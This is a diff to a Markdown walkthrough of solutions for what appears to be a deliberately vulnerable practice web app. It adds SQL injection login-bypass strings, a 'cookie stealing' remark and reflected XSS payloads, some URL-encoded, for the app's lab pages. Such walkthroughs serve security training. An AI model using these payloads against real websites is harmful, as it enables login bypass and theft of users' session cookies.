@@ -239,7 +239,10 @@ ok' or 1=1--
 ```
 login=ok' or 1=1-- "&password=ok' or 1=1--  
 ```
-
+### 💀  SQL Injection (Login Form/User) 💀
+```
+ok' or 1=1-- "
+```
 ### 💀  SQL Injection(SQLite) 💀
 
 ```
@@ -393,6 +396,7 @@ security_level=0; PHPSESSID=ing4kmubr61dqeskckjb4dfu9h; top_security=yes;hacker_
 ```
 ### 💀  Session Mgmt. - Session ID in URL 💀
 here you see your PHSESSID cookie in the url
+cookie stealing 
 ```
 Session IDs should never be exposed in the URL!
 ```
@@ -420,19 +424,23 @@ using burp to brutforce the commen weak password and login to the system. this p
 hacked using brup intruder and commen list of username/passwords
     
 ```
+### Session Mgmt. - Strong Sessions
+show different cookies change security level and visite given link to see the movies :0
+
 # A3 - Cross-Site Scripting (XSS)
 
 ### 💀  XSS - Reflected (GET) 💀
 
 xss_get.php
-
+you can insert html as well as js in the given fields
 ```
 <script>alert(document.cookie)</script>
 ```
 
 ### 💀  XSS - Reflected (POST) 💀
-
 xss_post.php
+
+the same but with POST request
 
 ```
 <script>alert(document.cookie)</script>
@@ -444,8 +452,11 @@ xss_json.php
 
 ```
 "}]}';prompt(0)</script>
-```
 
+```
+```
+title="%7D%5D%7D%27%3Bprompt%28"Hi%2C+Enter+Your+Name+Other+wise+your+game+is+ver+%3A0"%29<%2Fscript>&action=search
+```
 ### 💀  XSS - Reflected (AJAX/JSON) 💀
 
 xss_ajax_2-1.php
